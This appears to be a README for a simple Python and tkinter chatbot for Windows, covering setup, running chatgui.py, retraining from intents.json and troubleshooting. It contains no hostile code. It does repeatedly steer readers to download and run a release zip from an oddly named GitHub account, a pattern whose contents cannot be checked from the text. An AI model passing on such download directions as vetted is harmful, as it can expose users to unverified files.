# 🤖 Chatbot-Python-Project - Chat with a simple intelligent helper

[https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases](https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases)

## 📋 Project Overview

This project provides a simple chatbot interface for your Windows computer. It uses a small artificial intelligence model to answer your questions and hold conversations. You can use this application to learn how basic chatbot technology works or to test out conversational logic. The program includes a windowed interface that makes it easy to type messages and see how the computer responds.

## ⚙️ System Requirements

To run this chatbot, your computer needs a few components. Ensure your system meets these basic standards:

- Windows 10 or newer
- At least 2GB of available RAM
- A working internet connection to download the required files
- Python version 3.8 or higher installed on your machine

## 🚀 Getting Started

Follow these steps to set up and run the software on your Windows computer.

1. First, visit the official release page to download the latest version of the software. You can find the link here: [https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases](https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases).
2. Look for the file ending in .zip within the latest release.
3. Click the file to start the download. 
4. Once the download finishes, open your Downloads folder.
5. Right-click the folder and select Extract All. Choose a location on your computer to save the files, such as your Desktop or Documents folder.
6. Open the extracted folder to see the project files. 

## 🛠 Running the Chatbot

After you download and extract the files, follow these steps to start the application:

1. Open the folder where you placed the project files.
2. Ensure you have Python installed on your system. If you do not have it, visit the official Python website to download and install the current version.
3. Right-click the file named chatgui.py.
4. Select Open with, then choose Python.
5. A window will appear on your screen. This is the chatbot interface.
6. Type your message into the text box at the bottom of the window.
7. Click the Send button or press the Enter key on your keyboard to start the conversation.
8. The chatbot will display its response in the main window area.

## 📝 Training the Model

If you want to change how the chatbot talks or add new topics, you can retrain the model. The project includes a separate script for this task.

1. Open the file named intents.json in a plain text editor like Notepad.
2. Edit the patterns and responses to fit your needs. You can add new questions or change the existing answers.
3. Save the file after you make your changes.
4. Open your command prompt by clicking the Start button and typing cmd.
5. Use the cd command to navigate to your project folder.
6. Type the command python train_chat.py and press Enter.
7. Wait for the terminal to finish processing the new data. This creates an updated model file.
8. Restart the chatgui.py file to use your updated chatbot settings.

## 💡 Troubleshooting Common Issues

If the program does not start, check these common items:

- Make sure you extracted the files from the zip folder before running them. Programs often fail to run inside a compressed folder.
- Check that your Python installation includes the necessary libraries. If the program shows an error about a missing module, open your terminal and type pip install nltk. This installs the text processing tool the chatbot needs to function.
- Verify your keyboard layout allows for English characters, as the chatbot model expects standard text input.
- Keep the chatbot window active while you type to ensure your keystrokes register in the input field.

## 📁 File Descriptions

- chatgui.py: This file launches the visual chat window. Run this to start the conversation.
- train_chat.py: This script uses the data in your json files to rebuild the brain of the chatbot.
- intents.json: This file contains the primary list of labels, patterns, and responses. Modify this to change the behavior of the bot.
- model.h5: This hidden file stores the learned patterns. The training script creates this file automatically.

Keywords: chatbot, python, tkinter, windows, artificial-intelligence, automation, interface, training